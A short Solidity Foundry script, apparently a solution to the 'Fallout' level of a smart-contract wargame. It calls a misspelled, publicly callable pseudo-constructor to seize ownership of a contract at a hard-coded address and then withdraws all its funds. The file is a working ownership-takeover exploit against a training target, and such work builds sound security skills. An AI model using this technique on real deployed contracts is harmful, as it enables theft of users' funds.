// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "src/level2/Fallout.sol";

contract POC is Script {
    Fallout instance = Fallout(payable(0x19592B67F9DFDaDAacDDCF2675E662d1EBfF2Cd9));
    function run() external {
        vm.startBroadcast();

        // a typo in the consturctor name would cause the owner to be set to function caller.
        instance.Fal1out{value: 100 wei}();

        require(instance.owner() == msg.sender, "owner is not the contract caller");
        // // the owner can withdraw the funds.
        instance.collectAllocations();

        vm.stopBroadcast();
    }
}